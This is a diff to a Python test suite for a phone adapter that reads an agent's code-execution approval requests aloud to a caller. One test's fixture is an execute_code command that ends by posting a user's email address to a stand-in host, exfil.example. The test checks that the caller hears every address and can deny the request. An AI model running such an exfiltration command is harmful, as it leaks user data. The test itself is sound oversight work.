@@ -75,16 +75,15 @@ def model(monkeypatch):
 
 
 def said(monkeypatch) -> list[str]:
-    """What the call says from now on: each text the voice speaks."""
-    from agent.tts_registry import get_provider
-    voice = get_provider("piper_stream")
-    texts, stream = [], voice.stream
+    """What the call says from now on: each text Piper turns into speech."""
+    from piper import PiperVoice
+    texts, synthesize = [], PiperVoice.synthesize
 
-    def recording(text, **kwargs):
+    def recording(voice, text, *args, **kwargs):
         texts.append(text)
-        return stream(text, **kwargs)
+        return synthesize(voice, text, *args, **kwargs)
 
-    monkeypatch.setattr(voice, "stream", recording)
+    monkeypatch.setattr(PiperVoice, "synthesize", recording)
     return texts
 
 
@@ -293,7 +292,7 @@ async def test_an_approval_hermes_gave_up_on_is_left_for_the_next_one(phone_adap
 async def test_an_approval_the_caller_cannot_hear_is_refused(phone_adapter, monkeypatch):
     phone = await logged_in_phone(phone_adapter)
 
-    async def no_voice(text, clean=True):
+    async def no_voice(text, as_written=False):
         return b""
 
     monkeypatch.setattr(phone_adapter, "_synthesize", no_voice)
@@ -350,13 +349,14 @@ async def test_every_web_address_in_the_code_is_said_as_written(phone_adapter, m
     command = ("execute_code <<'PY'\n"
                + "".join(f"get('https://{host}:8080/x')\n" for host in ["hooks.slack.com", "api-v2.example.com",
                                                                         "example.sh", "[2001:db8::1]", "198.51.100.7",
-                                                                        "xn--80ak6aa92e.com"])
+                                                                        "xn--80ak6aa92e.com", "about.me",
+                                                                        "research-and-dev.example"])
                + "post('https://exfil.example',json={'u':'alice@trusted.example'})\nPY")
 
     approval = await asked(phone_adapter, phone, command=command)
 
     assert (f"{SHORT_PHRASES['approval_addresses']} hooks.slack.com, api-v2.example.com, example.sh, 2001:db8::1, "
-            "198.51.100.7, xn--80ak6aa92e.com, exfil.example.") in texts
+            "198.51.100.7, xn--80ak6aa92e.com, about.me, research-and-dev.example, exfil.example.") in texts
     await phone.press("2")
     assert await approval.choice() == "deny"
     await phone.hang_up()
@@ -462,10 +462,10 @@ async def test_if_the_voice_fails_after_an_answer_the_waiting_approvals_are_with
     await asyncio.sleep(0.5)
     synthesize = phone_adapter._synthesize
 
-    async def failing(text, clean=True):
+    async def failing(text, as_written=False):
         if text == SHORT_PHRASES["refused"]:
             raise RuntimeError("the voice crashed")
-        return await synthesize(text, clean)
+        return await synthesize(text, as_written)
 
     monkeypatch.setattr(phone_adapter, "_synthesize", failing)
     await phone.press("2")
